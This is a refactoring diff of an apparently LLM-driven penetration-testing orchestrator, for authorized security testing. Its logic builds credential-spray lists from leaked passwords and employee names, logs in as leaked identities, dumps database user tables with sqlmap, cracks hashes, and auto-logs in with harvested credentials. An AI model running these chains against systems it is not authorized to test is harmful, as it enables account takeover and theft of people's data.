@@ -32,7 +32,7 @@ class PhaseState:
 
 from agents.llm_client import LLMClient, TaskTier
 from agents.authorization import AuthorizationManager
-from core.memory.shared_context_v2 import SharedContextV2 as SharedContext
+from core.memory.shared_context import SharedContextV2 as SharedContext
 from core.tools.tool_registry import ToolRegistry
 from core.orchestration.agent_spawner import AgentSpawner
 from core.exploitation.chain_integration import ChainManager
@@ -42,16 +42,16 @@ from core.reporting.metrics import MetricsTracker
 from core.orchestration.automation import AutomationEngine
 from core.security.consent import get_consent
 from core.exploitation.request_capture import RequestCapturer
-from validation import gate as confidence_gate, DedupStore
-from compliance import ComplianceReporter, available_frameworks
+from core.validation import gate as confidence_gate, DedupStore
+from core.compliance import ComplianceReporter, available_frameworks
 
-from knowledge.store import KnowledgeStore as PersistentKnowledgeStore
+from core.knowledge.persistent_store import KnowledgeStore as PersistentKnowledgeStore
 import os
 import uuid
 
 from core.memory.stores import KnowledgeStore, EvidenceStore, FindingStore
 from core.orchestration.task_manager import TaskManager
-from orchestrator.scheduler import Scheduler
+from core.orchestration.legacy_scheduler import Scheduler
 from core.memory.context_resolver import ContextResolver
 
 from core.tools.tool_invocation_engine import ToolInvocationEngine
@@ -77,7 +77,7 @@ from core.hypothesis import HypothesisGenerator, HypothesisRanker
 from core.convergence import ConvergenceEngine, CompletionValidator
 from core.learning import ExperienceLearner
 from core.decisions import DecisionGuardV2
-from core.scheduling.experiment_scheduler_v2 import ExperimentScheduler
+from core.scheduling.experiment_scheduler import ExperimentScheduler
 # Replaced by execution_pipeline_v2
 from core.adaptation.generic_site_adapter import GenericSiteAdapter
 from core.checkpointing.secure_checkpoint import SecureCheckpoint
@@ -104,9 +104,9 @@ from core.security.authorization_service import AuthorizationService, Authorizat
 from core.reasoning.reasoning_engine import ReasoningEngine
 
 # P1a — Experiment Model
-from core.domain.experiment_v2 import SecurityExperiment, ExperimentState
+from core.domain.experiment import SecurityExperiment, ExperimentState
 from core.domain.task_state_machine import TaskStateMachine, TaskState
-from core.scheduling.experiment_scheduler_v2 import ExperimentScheduler as ExperimentSchedulerV2
+from core.scheduling.experiment_scheduler import ExperimentScheduler as ExperimentSchedulerV2
 from core.scheduling.duplicate_detector import DuplicateDetector
 
 # P1b — Deterministic Executors
@@ -169,11 +169,11 @@ from core.findings.finding_store import FindingStore as FindingStoreV2
 from core.coverage.security_test_catalog import SecurityTestCatalog as SecurityTestCatalogV2, build_default_catalog
 from core.coverage.applicability_engine import ApplicabilityEngine
 from core.coverage.coverage_matrix import CoverageMatrix, CoverageState
-from core.coverage.convergence_engine_v2 import ConvergenceEngine as ConvergenceEngineV2
-from core.attack_surface.endpoint_inventory_v2 import EndpointInventoryV2
+from core.coverage.convergence_engine import ConvergenceEngine as ConvergenceEngineV2
+from core.attack_surface.endpoint_inventory import EndpointInventoryV2
 
 # P3 — Integration + Reporting
-from core.execution.execution_pipeline_v2 import ExecutionPipelineV2
+from core.execution.execution_pipeline import ExecutionPipelineV2
 from core.reasoning.hypothesis_engine import HypothesisEngine
 from core.knowledge.knowledge_graph import KnowledgeGraph
 from core.reporting.coverage_report import CoverageReport
@@ -245,7 +245,18 @@ class ExecutionPhase(str, Enum):
     REPORTING = "REPORTING"
 
 
-class CentralBrain:
+from core.orchestration.central_brain_mixins.finding_ingestion import FindingIngestionMixin
+from core.orchestration.central_brain_mixins.persistence import PersistenceMixin
+from core.orchestration.central_brain_mixins.osint_bridge import OsintBridgeMixin
+from core.orchestration.central_brain_mixins.recon_context import ReconContextMixin
+
+
+class CentralBrain(
+    ReconContextMixin,
+    OsintBridgeMixin,
+    PersistenceMixin,
+    FindingIngestionMixin,
+):
     """The autonomous pentesting orchestrator. LLM drives everything."""
 
     @property
@@ -350,381 +361,6 @@ class CentralBrain:
             pass
         self._write_live_results()
 
-    def _build_recon_context(self) -> dict:
-        """Unified recon view for the UI: ALL subdomains labelled live/dead, the
-        filtered endpoint catalog, technologies, ports, ips, captured requests.
-        Used by both the live-results feed and the final report."""
-        subs = list(getattr(self.ctx, "subdomains", []) or [])
-        # Merge OSINT-discovered subdomains into the main list
-        osint_subs = getattr(self.ctx, "discovered_subdomains", []) or []
-        for s in osint_subs:
-            name = s.name if hasattr(s, 'name') else str(s)
-            if name and name not in subs:
-                subs.append(name)
-        # Merge discovered_domains too
-        for s in (getattr(self.ctx, "discovered_domains", []) or []):
-            name = str(s)
-            if name and name not in subs:
-                subs.append(name)
-
-        sub_status = getattr(self.ctx, "subdomain_status", {}) or {}
-        catalog = getattr(self.ctx, "endpoint_catalog", []) or []
-
-        seen_hosts = set()
-        subs_out = []
-        for s in subs:
-            host = s if isinstance(s, str) else (s.get("name") if isinstance(s, dict) else str(s))
-            host_n = str(host).replace("https://", "").replace("http://", "").rstrip("/").lower()
-            if host_n in seen_hosts:
-                continue
-            seen_hosts.add(host_n)
-            st = sub_status.get(host_n, {})
-            subs_out.append({
-                "name": host_n,
-                "live": bool(st.get("live")),
-                "status": "live" if st.get("live") else ("dead" if st else "unknown"),
-                "status_code": st.get("status_code", 0),
-                "note": st.get("note", ""),
-            })
-
-        if not catalog:
-            eps = getattr(self.ctx, "endpoints", {}) or {}
-            ep_iter = eps.values() if isinstance(eps, dict) else eps
-            for ep in ep_iter:
-                url = getattr(ep, "url", None) or (ep.get("url") or ep.get("name") if isinstance(ep, dict) else None)
-                if url:
-                    catalog.append({"url": str(url), "path": str(url), "method": "GET",
-                                    "host": "", "kind": "page"})
-
-        caps = getattr(self.ctx, "captured_requests", []) or []
-        caps_out = []
-        for r in caps[:200]:
-            caps_out.append({
-                "url": getattr(r, "url", None) or (r.get("url") if isinstance(r, dict) else str(r)),
-                "method": getattr(r, "method", None) or (r.get("method") if isinstance(r, dict) else "GET"),
-                "resource_type": r.get("resource_type", "") if isinstance(r, dict) else "",
-                "status": r.get("status", 0) if isinstance(r, dict) else 0,
-                "is_preflight": r.get("is_preflight", False) if isinstance(r, dict) else False,
-                "headers": r.get("headers", {}) if isinstance(r, dict) else {},
-                "post_data": r.get("post_data", "") if isinstance(r, dict) else "",
-            })
-
-        tool_execs = getattr(self.ctx, "tool_executions", []) or []
-        texecs_out = []
-        for e in tool_execs[:200]:
-            if isinstance(e, dict):
-                texecs_out.append(e)
-
-        return {
-            "subdomains": subs_out,
-            "endpoints": catalog,
-            "technologies": getattr(self.ctx, "technologies", {}) or {},
-            "captured_requests": caps_out,
-            "tool_executions": texecs_out,
-            "ports": getattr(self.ctx, "ports", []) or [],
-            "ips": getattr(self.ctx, "ips", []) or [],
-            "subdomain_summary": {
-                "total": len(subs_out),
-                "live": sum(1 for s in subs_out if s["live"]),
-                "dead": sum(1 for s in subs_out if not s["live"]),
-            },
-            "osint": self._build_osint_context(),
-            # Every other piece of recon intelligence, so nothing is lost.
-            "ssl_info": getattr(self.ctx, "ssl_info", {}) or {},
-            "headers": getattr(self.ctx, "headers", {}) or {},
-            "directories": getattr(self.ctx, "directories", []) or [],
-            "secrets": getattr(self.ctx, "secrets", []) or [],
-            "crawled_pages": (getattr(self.ctx, "crawled_pages", []) or [])[:200],
-            "dns_records": getattr(self.ctx, "dns_records", []) or [],
-        }
-
-    def _persist_recon_data(self):
-        """Persist the full recon context to Postgres so the user can see everything
-        recon collected — written live during recon, not just at report time."""
-        try:
-            from core.database.pg_store import ReconRepo
-            ReconRepo.save(self._scan_id, self.ctx.target, self._build_recon_context())
-            logger.info("[Recon] Full recon intelligence persisted to database")
-        except Exception as e:
-            logger.warning(f"[Recon] recon_data persist failed (non-fatal): {e}")
-
-    @staticmethod
-    def _mask_secret(val: str) -> str:
-        s = str(val or "")
-        if len(s) <= 4:
-            return "•" * len(s)
-        return s[:2] + "•" * max(4, len(s) - 4) + s[-2:]
-
-    def _osint_spray_material(self):
-        """
-        Turn stored OSINT into credential-spray material:
-          - exact leaked (username, password) pairs from GitHub/breach data
-          - usernames derived from discovered employees (emails + name patterns)
-          - passwords seen in leaks (paired with the derived usernames)
-        Returns (creds, usernames, passwords).
-        """
-        g = self.ctx.get
-        leaked = g("leaked_credentials", []) or []
-        employees = g("discovered_employees", []) or []
-        harvested = getattr(self.ctx, "harvested_creds", []) or []
-
-        creds, usernames, passwords = [], [], []
-        seen_u = set()
-
-        def _add_user(u):
-            u = str(u or "").strip()
-            if u and u.lower() not in seen_u:
-                seen_u.add(u.lower())
-                usernames.append(u)
-
-        def _derive_from_email(email):
-            local = str(email).split("@")[0].strip()
-            if local:
-                _add_user(local)
-                _add_user(email)  # some apps log in with full email
-            return local
-
-        def _ascii(s):
-            import unicodedata
-            return unicodedata.normalize("NFKD", str(s)).encode("ascii", "ignore").decode()
-
-        def _derive_from_name(name):
-            parts = [p for p in re.split(r"[\s.]+", _ascii(name).strip().lower()) if p.isalpha()]
-            if len(parts) >= 2:
-                f, l = parts[0], parts[-1]
-                for u in (f"{f}.{l}", f"{f[0]}{l}", f"{f}{l}", f"{f}_{l}", f):
-                    _add_user(u)
-            elif parts:
-                _add_user(parts[0])
-
-        # 1) leaked credential pairs
-        for c in (list(leaked) + list(harvested)):
-            if not isinstance(c, dict):
-                continue
-            u = c.get("username") or c.get("user") or c.get("email")
-            p = c.get("password") or c.get("secret") or c.get("value")
-            if u and p:
-                creds.append((str(u), str(p)))
-            if u and "@" in str(u):
-                _derive_from_email(u)
-            elif u:
-                _add_user(str(u))
-            if p:
-                passwords.append(str(p))
-
-        # 2) employees -> usernames
-        for e in employees:
-            if isinstance(e, dict):
-                if e.get("email"):
-                    _derive_from_email(e["email"])
-                if e.get("name"):
-                    _derive_from_name(e["name"])
-                if e.get("username"):
-                    _add_user(e["username"])
-            elif isinstance(e, str):
-                (_derive_from_email(e) if "@" in e else _derive_from_name(e))
-
-        # de-dup passwords, cap sizes
-        passwords = list(dict.fromkeys(passwords))[:20]
-        return creds[:100], usernames[:50], passwords
-
-    def _osint_identities(self) -> dict:
-        """Structured OSINT identities for IDOR/access-control and JWT forgery:
-        emails, usernames, admin/owner candidates, and leaked username:password pairs."""
-        creds, users, _pw = self._osint_spray_material()
-        g = self.ctx.get
-        employees = g("discovered_employees", []) or []
-
-        emails, admin_emails = [], []
-        for e in employees:
-            email = e.get("email") if isinstance(e, dict) else (e if isinstance(e, str) and "@" in e else None)
-            title = (e.get("title", "") if isinstance(e, dict) else "").lower()
-            if email:
-                emails.append(email)
-                if any(k in title for k in ("owner", "admin", "lead", "founder", "cto", "ceo", "director")):
-                    admin_emails.append(email)
-        # leaked-cred usernames that look like emails are admin candidates too
-        for u, _p in creds:
-            if "@" in u:
-                emails.append(u)
-
-        emails = list(dict.fromkeys(emails))
-        idents = {
-            "usernames": users,
-            "emails": emails,
-            "admin_emails": list(dict.fromkeys(admin_emails)) or emails[:2],
-            "leaked_pairs": creds,
-        }
-        try:
-            self.ctx.osint_identities = idents
-            self.ctx._dynamic_keys.add("osint_identities")
-        except Exception:
-            pass
-        return idents
-
-    async def _augment_auth_with_osint(self):
-        """Feed leaked username:password pairs into the auth layer as real identities,
-        then (re)establish sessions so the access-control / IDOR replay engine can test
-        cross-user object access AS those users."""
-        idents = self._osint_identities()
-        pairs = idents.get("leaked_pairs") or []
-        if not pairs:
-            return
-        # Find a login endpoint from what recon already discovered.
-        login_url = ""
-        candidates = []
-        for r in getattr(self.ctx, "captured_requests", []) or []:
-            u = getattr(r, "url", None) or (r.get("url") if isinstance(r, dict) else None)
-            if u:
-                candidates.append(str(u))
-        for ep in getattr(self.ctx, "endpoint_catalog", []) or []:
-            if isinstance(ep, dict) and ep.get("url"):
-                candidates.append(ep["url"])
-        for u in candidates:
-            if any(k in u.lower() for k in ("login", "signin", "session", "/auth", "user/login")):
-                login_url = u.split("?")[0]
-                break
-
-        existing = getattr(self.ctx, "auth_credentials", None) or []
-        new_creds = list(existing)
-        for i, (user, pw) in enumerate(pairs[:5]):
-            new_creds.append({
-                "role": f"osint_{i}_{user.split('@')[0][:12]}",
-                "username": user, "password": pw,
-                "login_url": login_url,   # may be "" -> auth layer will try form detection
-            })
-        self.ctx.auth_credentials = new_creds
-        try:
-            # Re-establish sessions (multi-role) — registers these leaked identities
-            # into the replay/access-control engine via the identity bridge.
-            await self._setup_auth_session()
-            logger.info(f"[OSINT-Auth] Added {min(len(pairs),5)} leaked identities to auth/IDOR testing "
-                        f"(login_url={login_url or 'auto-detect'})")
-        except Exception as e:
-            logger.warning(f"[OSINT-Auth] leaked-identity auth failed (non-fatal): {e}")
-
-    def _build_osint_context(self) -> dict:
-        """Surface OSINT intelligence (employees, GitHub leaks, cloud buckets, threat
-        correlations, DNS/mail intel) for the UI. Secrets are masked; the operator
-        sees WHAT leaked and WHERE, not raw credentials in plaintext."""
-        g = self.ctx.get
-        creds = g("leaked_credentials", []) or []
-        masked_creds = []
-        for c in creds:
-            if isinstance(c, dict):
-                masked_creds.append({
-                    "username": c.get("username") or c.get("user") or c.get("email") or "",
-                    "type": c.get("type") or c.get("credential_type") or "credential",
-                    "source": c.get("source") or c.get("repo") or c.get("url") or "",
-                    "secret": self._mask_secret(c.get("password") or c.get("secret") or c.get("value") or ""),
-                })
-            else:
-                masked_creds.append({"source": str(c)})
-
-        osint = {
-            "employees": g("discovered_employees", []) or [],
-            "leaked_credentials": masked_creds,
-            "cloud_buckets": g("cloud_buckets", []) or [],
-            "domain_intelligence": g("domain_intelligence", {}) or {},
-            "threat_correlations": g("threat_correlations", []) or [],
-            "findings": g("osint_findings", []) or [],
-        }
-        osint["summary"] = {
-            "employees": len(osint["employees"]),
-            "leaked_credentials": len(masked_creds),
-            "cloud_buckets": len(osint["cloud_buckets"]),
-            "threat_correlations": len(osint["threat_correlations"]),
-        }
-        # Include any other dynamically-collected intelligence not covered above.
-        try:
-            known = {"discovered_employees", "leaked_credentials", "cloud_buckets",
-                     "domain_intelligence", "threat_correlations", "osint_findings",
-                     "discovered_subdomains", "target_profile", "discovered_ips",
-                     "discovered_domains", "subdomain_status", "endpoint_catalog"}
-            extra = {k: v for k, v in self.ctx.dynamic_data().items()
-                     if k not in known and not isinstance(v, (bytes,))}
-            if extra:
-                osint["other"] = extra
-        except Exception:
-            pass
-        return osint
-
-    def _write_live_results(self):
-        """Write structured live results for the UI to poll."""
-        try:
-            import json as _json
-            subs = getattr(self.ctx, "subdomains", []) or []
-            eps = getattr(self.ctx, "endpoints", []) or []
-            ports = getattr(self.ctx, "ports", []) or []
-            sub_status = getattr(self.ctx, "subdomain_status", {}) or {}
-            endpoint_catalog = getattr(self.ctx, "endpoint_catalog", []) or []
-            ips = getattr(self.ctx, "ips", []) or []
-            techs = getattr(self.ctx, "technologies", {}) or {}
-            vulns = self.ctx.vulnerabilities or []
-            exploits = self.ctx.exploit_results or []
-
-            def _serialize(items):
-                out = []
-                for item in items:
-                    if isinstance(item, dict):
-                        out.append(item)
-                    elif isinstance(item, str):
-                        out.append({"name": item})
-                    elif hasattr(item, "__dict__"):
-                        out.append({k: v for k, v in item.__dict__.items() if not k.startswith("_")})
-                    else:
-                        out.append({"value": str(item)})
-                return out
-
-            captured = getattr(self.ctx, 'captured_requests', []) or []
-            attack_chains = getattr(self.ctx, 'attack_chains', None) or {}
-
-            recon_ctx = self._build_recon_context()
-            recon_ctx["ports"] = _serialize(ports) if ports else recon_ctx.get("ports", [])
-            recon_ctx["ips"] = _serialize(ips) if ips else recon_ctx.get("ips", [])
-            if techs and isinstance(techs, dict):
-                recon_ctx["technologies"] = techs
-            results = {
-                "recon": recon_ctx,
-                "vulnerabilities": _serialize(vulns),
-                "exploits": _serialize(exploits),
-                "captured_requests": _serialize(captured[:100]),
-                "attack_chains": attack_chains,
-            }
-            try:
-                from core.database.pg_store import (LiveDataRepo, ReconRepo, VulnRepo,
-                    ExploitResultRepo, AttackChainRepo, PostExploitRepo, ScanMetadataRepo)
-                LiveDataRepo.upsert_results(self._scan_id, results)
-                ReconRepo.save(self._scan_id, self.ctx.target, recon_ctx)
-                if results.get("vulnerabilities"):
-                    VulnRepo.bulk_insert(self._scan_id, results["vulnerabilities"])
-                if results.get("exploits"):
-                    ExploitResultRepo.bulk_insert(self._scan_id, results["exploits"])
-                if attack_chains:
-                    AttackChainRepo.bulk_upsert(self._scan_id, attack_chains if isinstance(attack_chains, list) else list(attack_chains.values()) if isinstance(attack_chains, dict) else [])
-                privesc = getattr(self.ctx, 'privesc_findings', None)
-                if privesc:
-                    PostExploitRepo.bulk_upsert(self._scan_id, 'privesc', privesc)
-                creds = getattr(self.ctx, 'harvested_creds', None)
-                if creds:
-                    PostExploitRepo.bulk_upsert(self._scan_id, 'credentials', creds)
-                lateral = getattr(self.ctx, 'lateral_plan', None)
-                if lateral:
-                    PostExploitRepo.bulk_upsert(self._scan_id, 'lateral_movement', lateral if isinstance(lateral, list) else [lateral])
-                persist_plan = getattr(self.ctx, 'persistence_plan', None)
-                if persist_plan:
-                    PostExploitRepo.bulk_upsert(self._scan_id, 'persistence', persist_plan if isinstance(persist_plan, list) else [persist_plan])
-                mitre = getattr(self.ctx, 'mitre_mappings', None)
-                if mitre:
-                    ScanMetadataRepo.upsert(self._scan_id, 'mitre_mappings', mitre)
-                agents = getattr(self.ctx, 'agents_spawned', None)
-                if agents:
-                    ScanMetadataRepo.upsert(self._scan_id, 'agents_spawned', agents)
-            except Exception:
-                pass
-        except Exception:
-            pass
-
     def _transition_to_next_phase(self):
         next_phase = self._evaluate_phase_transition()
         if next_phase:
@@ -775,8 +411,17 @@ class CentralBrain:
         self._activity = get_activity_log()
 
         self.max_agents_per_phase = 15
-        self.report_dir = Path("reports")
-        self.report_dir.mkdir(exist_ok=True)
+        # reports/ is opt-in via REPORTS_ENABLED (default off). See
+        # core/common/reports_config.py. When disabled, `report_dir` points
+        # at a temp path so downstream writers can no-op harmlessly.
+        from core.common.reports_config import reports_enabled, reports_dir
+        if reports_enabled():
+            self.report_dir = reports_dir()
+            self.report_dir.mkdir(parents=True, exist_ok=True)
+        else:
+            import tempfile
+            self.report_dir = Path(tempfile.gettempdir()) / "antigravity_disabled_reports"
+            # Do not create — writers that need reports must gate on reports_enabled().
         self.failed_tools = set()  # NEW: Brain-level tool failure tracking
         self.current_phase = ExecutionPhase.RECON
         self.phase_config = PhaseConfig()
@@ -801,7 +446,10 @@ class CentralBrain:
         self.target_profile = None  # Populated in run() after tool validation
         
         
-        db_path = os.getenv("KNOWLEDGE_DB_PATH", str(self.report_dir / "findings.db"))
+        # Accept KNOWLEDGE_DB_PATH (canonical) with legacy KNOWLEDGE_DB fallback.
+        db_path = os.getenv("KNOWLEDGE_DB_PATH") \
+                  or os.getenv("KNOWLEDGE_DB") \
+                  or str(self.report_dir / "findings.db")
         self.persistent_knowledge_store = PersistentKnowledgeStore(db_path)
         self.target_id = f"tgt_{uuid.uuid4().hex[:12]}"
         self.persistent_knowledge_store.add_target(
@@ -934,7 +582,7 @@ class CentralBrain:
         self.reasoning_engine = ReasoningEngine(llm_client=None)
 
         # ── P1a: Experiment Model ──
-        self.experiment_scheduler_v2 = ExperimentSchedulerV2(max_queue_size=2000)
+        self.experiment_scheduler = ExperimentSchedulerV2(max_queue_size=2000)
         self.duplicate_detector = DuplicateDetector()
 
         # ── P1b: Deterministic Executors ──
@@ -1286,10 +934,18 @@ class CentralBrain:
             "crlf_header_01": self.info_disc_executor,
         }
         self._register_capabilities()
-        self.tool_portfolio = ToolPortfolio()
+        # Share one Portfolio globally so core.common.tool_retry can consult it.
+        from core.tools.tool_portfolio import get_global_portfolio
+        self.tool_portfolio = get_global_portfolio()
         self.tool_portfolio.register_fallback_chain("sql_injection", ["sqlmap", "nuclei", "custom_mutator"])
         self.tool_portfolio.register_fallback_chain("xss", ["dalfox", "nuclei", "browser"])
         self.tool_portfolio.register_fallback_chain("port_discovery", ["nmap", "masscan", "port_check"])
+        self.tool_portfolio.register_fallback_chain("subdomain_enumeration", ["subfinder", "amass", "assetfinder", "dnsenum"])
+        self.tool_portfolio.register_fallback_chain("dns_intelligence", ["dig", "dnsenum", "fierce", "whois"])
+        self.tool_portfolio.register_fallback_chain("directory_bruteforce", ["ffuf", "feroxbuster", "gobuster", "dirsearch", "dirb"])
+        self.tool_portfolio.register_fallback_chain("web_crawling", ["katana", "gobuster", "ffuf"])
+        self.tool_portfolio.register_fallback_chain("technology_fingerprinting", ["httpx", "whatweb", "wafw00f"])
+        self.tool_portfolio.register_fallback_chain("vulnerability_scanning", ["nuclei", "nikto", "wpscan"])
 
         # ── P1c: Evidence / Oracle / Finding ──
         self.evidence_validator = EvidenceValidator()
@@ -1298,10 +954,10 @@ class CentralBrain:
 
         # ── P2: Coverage ──
         self.test_catalog_v2 = build_default_catalog()
-        self.endpoint_inventory_v2 = EndpointInventoryV2()
+        self.endpoint_inventory = EndpointInventoryV2()
         self.applicability_engine = ApplicabilityEngine(self.test_catalog_v2, self.attack_surface)
         self.coverage_matrix = CoverageMatrix([], [])
-        self.convergence_engine_v2 = ConvergenceEngineV2(self.coverage_matrix)
+        self.convergence_engine = ConvergenceEngineV2(self.coverage_matrix)
 
         # ── P3: Integration + Reporting ──
         self.pipeline_v2 = ExecutionPipelineV2(
@@ -1364,7 +1020,7 @@ class CentralBrain:
             coverage_engine=self.coverage_engine if hasattr(self, 'coverage_engine') else None,
             identity_coverage=self.identity_coverage,
             learning_engine=self.structured_learning,
-            convergence_engine=self.convergence_engine_v2,
+            convergence_engine=self.convergence_engine,
             target_health=self.target_health_manager,
         )
 
@@ -1404,7 +1060,7 @@ class CentralBrain:
 
     def _build_coverage_matrix_from_surface(self):
         """Rebuild the coverage matrix from current endpoint inventory + test catalog."""
-        endpoints = self.endpoint_inventory_v2.list_endpoints()
+        endpoints = self.endpoint_inventory.list_endpoints()
         ep_ids = [ep.get("endpoint_id", ep.get("url", "")) for ep in endpoints]
 
         applicable_pairs = []
@@ -1448,7 +1104,7 @@ class CentralBrain:
             if (ep_id, test_id) not in {(a, b) for a, b in applicable_pairs}:
                 self.coverage_matrix.update(ep_id, test_id, CoverageState.NOT_DISCOVERED)
 
-        self.convergence_engine_v2 = ConvergenceEngineV2(self.coverage_matrix)
+        self.convergence_engine = ConvergenceEngineV2(self.coverage_matrix)
         self.pipeline_v2 = ExecutionPipelineV2(
             executor_registry=self.executor_registry,
             tool_portfolio=self.tool_portfolio,
@@ -1465,14 +1121,14 @@ class CentralBrain:
         if hasattr(self.ctx, 'endpoints') and self.ctx.endpoints:
             for ep in self.ctx.endpoints:
                 if isinstance(ep, str):
-                    self.endpoint_inventory_v2.add_endpoint({"url": ep, "method": "GET"})
+                    self.endpoint_inventory.add_endpoint({"url": ep, "method": "GET"})
                 elif isinstance(ep, dict):
-                    self.endpoint_inventory_v2.add_endpoint(ep)
+                    self.endpoint_inventory.add_endpoint(ep)
                 count += 1
 
         try:
             for ep in self.attack_surface.endpoints.get_endpoints():
-                self.endpoint_inventory_v2.add_endpoint({
+                self.endpoint_inventory.add_endpoint({
                     "endpoint_id": ep.endpoint_id,
                     "url": ep.path,
                     "method": ep.method_set[0] if ep.method_set else "GET",
@@ -1485,10 +1141,10 @@ class CentralBrain:
             logger.debug(f"[V2Sync] Could not sync attack surface endpoints: {e}")
 
         if count > 0:
-            logger.info(f"[V2Sync] Fed {count} endpoints into EndpointInventoryV2 ({self.endpoint_inventory_v2.list_endpoints().__len__()} unique)")
+            logger.info(f"[V2Sync] Fed {count} endpoints into EndpointInventoryV2 ({self.endpoint_inventory.list_endpoints().__len__()} unique)")
             self.security_context_v2.endpoints = {
                 ep.get("endpoint_id", ep.get("url", "")): ep
-                for ep in self.endpoint_inventory_v2.list_endpoints()
+                for ep in self.endpoint_inventory.list_endpoints()
             }
 
     def _sync_v1_findings_to_coverage_matrix(self):
@@ -1672,7 +1328,7 @@ class CentralBrain:
                             "role": cred["role"],
                         },
                     )
-                    self.experiment_scheduler_v2.queue(exp)
+                    self.experiment_scheduler.queue(exp)
             else:
                 exp = SecurityExperiment(
                     hypothesis_id=h.hypothesis_id,
@@ -1684,11 +1340,11 @@ class CentralBrain:
                         **identity_ctx,
                     },
                 )
-                if not self.experiment_scheduler_v2.queue(exp):
+                if not self.experiment_scheduler.queue(exp):
                     continue
 
-        while self.experiment_scheduler_v2.size() > 0 and executed < max_experiments:
-            exp = self.experiment_scheduler_v2.next()
+        while self.experiment_scheduler.size() > 0 and executed < max_experiments:
+            exp = self.experiment_scheduler.next()
             if not exp:
                 break
 
@@ -1715,7 +1371,7 @@ class CentralBrain:
                     self.coverage_matrix.update_state(exp.endpoint_id, exp.capability, CoverageState.BLOCKED)
                 logger.info(f"[V2Recovery] {ft.value} → {action.value} for {exp.capability}@{exp.endpoint_id}")
 
-        conv = self.convergence_engine_v2.calculate_convergence()
+        conv = self.convergence_engine.calculate_convergence()
         logger.info(f"[V2Cycle] Executed {executed} experiments, coverage={conv:.1%}, gaps={len(self.coverage_matrix.get_gaps())}")
 
     def _build_identity_context(self) -> Dict[str, Any]:
@@ -1913,6 +1569,19 @@ class CentralBrain:
                         logger.info(f"[RAG] Ingested {count} confirmed findings into knowledge base")
             except Exception as e:
                 logger.debug(f"[RAG] Finding ingestion skipped: {e}")
+
+        # Per-scan temp cleanup — always runs at scan end (SCAN_CLEANUP_ENABLED=0 disables).
+        # Wipes /tmp/*.png (screenshots), /tmp/spray_*.html (credential spray),
+        # /tmp/schema_probe.txt (API probing), /tmp/ffuf-*, sqlmap/nuclei per-run
+        # session dirs INSIDE the Kali container, plus host-side ag_screenshot_*
+        # and detonate_* tempdirs.
+        try:
+            from core.common.scan_cleanup import cleanup_after_scan
+            sid = getattr(self, "_scan_id", None) or getattr(self.ctx, "scan_id", None) or ""
+            summary = cleanup_after_scan(scan_id=sid)
+            logger.info(f"[ScanCleanup] Done for {sid}: {summary}")
+        except Exception as e:
+            logger.warning(f"[ScanCleanup] Failed (non-fatal): {e}")
 
         return {"stopped": stopped, "phase": self.current_phase.value if self.current_phase else None}
 
@@ -2114,7 +1783,7 @@ class CentralBrain:
             try:
                 identities = list(getattr(self.identity_manager, '_identities', {}).keys()) if hasattr(self, 'identity_manager') else []
                 if identities:
-                    ep_ids = [ep.get("endpoint_id", str(i)) for i, ep in enumerate(self.endpoint_inventory_v2.list_endpoints())]
+                    ep_ids = [ep.get("endpoint_id", str(i)) for i, ep in enumerate(self.endpoint_inventory.list_endpoints())]
                     test_ids = [t.test_id for t in self.test_catalog_v2.list_all()]
                     cells = self.identity_coverage.initialize_matrix(test_ids, ep_ids, identities)
                     logger.info(f"[IdentityCoverage] Initialized {cells} coverage cells for {len(identities)} identities")
@@ -2373,6 +2042,42 @@ class CentralBrain:
             except Exception as e:
                 logger.warning(f"[CredSpray] Credential spray failed (non-fatal): {e}")
 
+            # SQLi → sqlmap escalation: for each confirmed SQL-injection vuln,
+            # run sqlmap --batch --dump against the known-users table so admin
+            # rows land in harvested_creds and feed the auth chain below.
+            try:
+                await self._escalate_sqli_to_dump()
+            except Exception as _e:
+                logger.warning(f"[SQLiDump] escalation failed (non-fatal): {_e}")
+
+            # Hash cracking: for every harvested password hash try the top-10k
+            # wordlist (Python md5/sha1/sha256 + hashcat fallback for bcrypt).
+            # Cracked plaintexts flow into harvested_creds → CredChain.
+            try:
+                from core.exploitation.hash_cracker import crack_hashes
+                from pathlib import Path as _P
+                await crack_hashes(self.ctx, _P(__file__).resolve().parents[2])
+            except Exception as _e:
+                logger.warning(f"[HashCracker] failed (non-fatal): {_e}")
+
+            # Injection replay: mutate every captured request's params with SQLi/
+            # XSS/CMD/SSRF payloads. Catches injection on authenticated POST/JSON
+            # bodies the crawler already reached but plain scanners never fuzz.
+            try:
+                from core.exploitation.request_replayer import replay_captured_requests
+                await replay_captured_requests(self.ctx, max_requests=0)
+            except Exception as _e:
+                logger.warning(f"[RequestReplayer] failed (non-fatal): {_e}")
+
+            # Auto-login with any plaintext creds (from cracker / sqlmap dump / OSINT).
+            # Each successful login obtains a fresh JWT which we publish to the auth
+            # registry AND record as an "Access Gained" event. This is what lets the
+            # CredChain block below actually operate as an authenticated user.
+            try:
+                await self._auto_login_with_harvested_creds()
+            except Exception as _e:
+                logger.warning(f"[AutoLogin] failed (non-fatal): {_e}")
+
             # Credential chaining: auto-run IDOR/JWT/authz/mass-assignment tests
             # with harvested credentials against all discovered endpoints
             if self.ctx.harvested_creds:
@@ -2400,7 +2105,7 @@ class CentralBrain:
                         "authz_mass_assignment_01", "csrf_basic_01",
                         "bizlogic_price_manipulation_01", "bizlogic_negative_quantity_01",
                     ]
-                    from core.domain.experiment_v2 import SecurityExperiment
+                    from core.domain.experiment import SecurityExperiment
                     cred_chain_ran = 0
                     for tid in auth_test_ids:
                         executor = self.executor_registry.get(tid)
@@ -2427,6 +2132,17 @@ class CentralBrain:
                     logger.info(f"[CredChain] Executed {cred_chain_ran} authenticated tests")
                 except Exception as e:
                     logger.warning(f"[CredChain] Authenticated sweep failed (non-fatal): {e}")
+
+            # Expert-mode probes: JWT kid, prototype pollution, HTTP smuggling
+            # sweep across all hosts, SSRF metadata, timing user-enum, captcha
+            # bypass + brute. These plug coverage gaps a professional pentester
+            # would always cover but the default scanners skip.
+            try:
+                from core.exploitation.expert_probes import run_all_expert_probes
+                exp_findings = await run_all_expert_probes(self.ctx)
+                logger.info(f"[ExpertProbes] Ran full expert sweep: {len(exp_findings)} finding(s)")
+            except Exception as _e:
+                logger.warning(f"[ExpertProbes] sweep failed (non-fatal): {_e}")
 
             # Web-level privilege escalation: forced browsing to admin paths + role
             # escalation with any harvested credentials.
@@ -2490,7 +2206,7 @@ class CentralBrain:
                 self._build_coverage_matrix_from_surface()
                 self._sync_v1_findings_to_coverage_matrix()
                 self._run_v2_experiment_cycle()
-                conv = self.convergence_engine_v2.calculate_convergence()
+                conv = self.convergence_engine.calculate_convergence()
